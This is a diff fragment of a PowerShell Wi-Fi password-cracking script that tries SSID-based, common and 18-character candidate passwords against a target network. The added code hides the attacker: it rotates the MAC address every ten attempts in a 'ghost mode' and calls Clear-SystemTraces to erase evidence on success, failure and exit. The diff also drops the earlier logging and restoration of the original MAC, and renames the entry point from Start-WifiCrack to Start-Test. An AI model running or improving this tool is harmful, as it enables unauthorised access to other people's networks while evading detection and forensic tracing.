+        Write-Host "  [3/3] 18-character patterns..." -ForegroundColor Gray
+        $p3 = Get-18CharPatterns
+        
+        # Combine
+        $allPasswords = @()
+        $allPasswords += $p1
+        $allPasswords += $p2 | Where-Object { $_ -notin $allPasswords }
+        $allPasswords += $p3 | Where-Object { $_ -notin $allPasswords }
+        
+        Write-Host "`n[READY] Total unique passwords: $($allPasswords.Count)" -ForegroundColor Green
+        Write-Host "[INFO] Order: 1) SSID-based, 2) Common, 3) 18-char patterns" -ForegroundColor Gray
+        Write-Host "[INFO] Press 'Q' to stop, 'R' to rotate MAC`n" -ForegroundColor Yellow
+        
+        # Test loop
+        $startTime = Get-Date
+        $tested = 0
+        $phase = "PHASE 1/3"
+        $phaseName = "SSID-BASED"
+        
+        for ($i = 0; $i -lt $allPasswords.Count; $i++) {
+            $password = $allPasswords[$i]
+            $tested++
+            
+            # Determine phase
+            if ($i -eq $p1.Count) { 
+                $phase = "PHASE 2/3"
+                $phaseName = "COMMON"
+                Write-Host "`n[$phase] Testing common world passwords..." -ForegroundColor Cyan
+            }
+            elseif ($i -eq ($p1.Count + $p2.Count)) {
+                $phase = "PHASE 3/3"
+                $phaseName = "18CHAR-PATTERN"
+                Write-Host "`n[$phase] Testing 18-character patterns..." -ForegroundColor Cyan
             }
             
-            # Test connection
-            $success = Test-WifiConnection -SSID $target.SSID -Password $password -Security $target.Security -Interface $script:CONFIG.Interface -LogFile $paths.LogFile -DebugFile $paths.DebugFile
+            # Progress
+            if ($i % 5 -eq 0 -or $i -eq 0) {
+                $percent = [math]::Min(($i / $allPasswords.Count) * 100, 100)
+                Write-Progress -Activity "[$phaseName] Testing passwords" -Status $password -PercentComplete $percent
+            }
+            
+            # Key check
+            if ([Console]::KeyAvailable) {
+                $key = [Console]::ReadKey($true)
+                if ($key.Key -eq 'Q') { 
+                    Write-Host "`n[STOP] User interrupted testing" -ForegroundColor Yellow
+                    break 
+                }
+                if ($key.Key -eq 'R') {
+                    Write-Host "`n[ANON] Rotating MAC address..." -ForegroundColor Cyan
+                    Set-RandomMac -Interface $Global:Config.Interface | Out-Null
+                }
+            }
+            
+            # Rotate MAC every 10 in ghost mode
+            if ($Global:Config.GhostMode -and ($tested % 10 -eq 0) -and ($tested -gt 0)) {
+                Set-RandomMac -Interface $Global:Config.Interface | Out-Null
+            }
+            
+            # Test
+            $success = Test-Password -SSID $target.SSID -Password $password -Interface $Global:Config.Interface
             
             if ($success) {
-                $elapsed = $connectionMgr.GetElapsedTime()
-                $stats = $progress.GetStatistics()
+                $elapsed = (Get-Date) - $startTime
                 
-                Write-Host "`n`nPASSWORD FOUND!" -ForegroundColor Green
-                Write-Host "SSID: $($target.SSID)" -ForegroundColor Green
-                Write-Host "Password: $password" -ForegroundColor Green
-                Write-Host "Time: $($elapsed.ToString('mm\:ss'))" -ForegroundColor Green
+                Write-Host "`n`n[SUCCESS] ==========================================" -ForegroundColor Green
+                Write-Host "  PASSWORD FOUND!" -ForegroundColor Green
+                Write-Host "  SSID: $($target.SSID)" -ForegroundColor White
+                Write-Host "  Password: $password" -ForegroundColor Green
+                Write-Host "  Phase: $phaseName" -ForegroundColor Cyan
+                Write-Host "  Time: $($elapsed.ToString('mm\:ss'))" -ForegroundColor Gray
+                Write-Host "  Tested: $tested of $($allPasswords.Count)" -ForegroundColor Gray
+                Write-Host "========================================== [SUCCESS]" -ForegroundColor Green
                 
-                if ($password -match '^[0-9A-F]{18}$') {
-                    Write-Host "Type: 18-char HEXADECIMAL" -ForegroundColor Magenta
-                } else {
-                    Write-Host "Type: ISP Pattern (Orange/Vodacom)" -ForegroundColor Cyan
-                }
-                
-                Write-Log "SUCCESS: Password found" "SUCCESS" $paths.LogFile $paths.DebugFile
-                
-                $result = @"
-SSID: $($target.SSID)
-Password: $password
-Time: $($elapsed.ToString('mm\:ss'))
-Tested: $($stats.TestedPasswords)
-Date: $(Get-Date)
-"@
-                $result | Out-File -FilePath $paths.SuccessFile -Encoding UTF8
-                
-                # Restore MAC
-                if (-not $DisableMacSpoof) {
-                    Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
-                }
+                # Cleanup
+                Clear-SystemTraces
+                Set-RandomMac -Interface $Global:Config.Interface | Out-Null
                 
                 return
             }
-            
-            Add-Content -Path $paths.WrongPasswordsFile -Value $password
         }
         
-        # End
-        $progress.Complete()
-        $elapsed = $connectionMgr.GetElapsedTime()
+        # Not found
+        Write-Host "`n[RESULT] Password not found" -ForegroundColor Red
+        Write-Host "  Total tested: $($allPasswords.Count) passwords" -ForegroundColor Gray
         
-        Write-Host "`nPassword not found." -ForegroundColor Red
-        Write-Host "Time: $($elapsed.ToString('mm\:ss'))" -ForegroundColor Yellow
-        Write-Host "Tested: Hex=$hexTested, Patterns=$patternTested" -ForegroundColor Gray
-        
-        # Restore MAC
-        if (-not $DisableMacSpoof) {
-            Write-Host "`nRestoring original MAC..." -ForegroundColor Yellow
-            Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
-        }
+        # Cleanup
+        Clear-SystemTraces
+        Set-RandomMac -Interface $Global:Config.Interface | Out-Null
         
     }
     catch {
-        Write-Host "`nCritical error: $_" -ForegroundColor Red
-        Write-Log "Critical error: $_" "ERROR"
-        
-        if (-not $DisableMacSpoof -and $script:CONFIG.Interface) {
-            Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
-        }
+        Write-Host "`n[ERROR] $_" -ForegroundColor Red
+        Write-Host $_.ScriptStackTrace -ForegroundColor Gray
     }
     finally {
-        # Ensure MAC is restored on abrupt exit
-        if (-not $DisableMacSpoof -and $script:CONFIG.Interface -and $script:CONFIG.SpoofedMac) {
-            Write-Host "`nExit detected. Restoring original MAC..." -ForegroundColor Yellow
-            Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
+        # Emergency cleanup
+        Clear-SystemTraces
+        if ($Global:Config.Interface) {
+            Set-RandomMac -Interface $Global:Config.Interface | Out-Null
         }
         
-        Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
+        Write-Host "`n[DONE] Press any key to exit..." -ForegroundColor Cyan
         $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
     }
 }
 
-# ============================================
-# ENTRY POINT
-# ============================================
-
+# Set priority and start
 try {
     $proc = Get-Process -Id $PID
     $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
-}
-catch { }
+} catch {}
 
-Start-WifiCrack
+Start-Test
